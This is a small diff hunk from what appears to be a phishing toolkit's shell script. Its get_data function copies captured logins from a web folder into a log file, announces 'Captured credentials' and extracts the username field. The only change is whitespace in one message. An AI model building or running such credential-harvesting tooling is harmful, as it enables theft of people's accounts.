@@ -207,7 +207,7 @@ get_data() {
     [ ! -d ./logs ] && mkdir logs
 
     cat ./www/src/dados.txt > ./logs/dataSocial.txt
-    printf "\r\e[0m[-] Captured credentials:    \e[0m\n"
+    printf "\r\e[0m[-] Captured credentials:     \e[0m\n"
     printf "\r\e[0m[+] Your log is in \e[32mlogs/dataSocial.txt\e[0m\n"
 
     usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
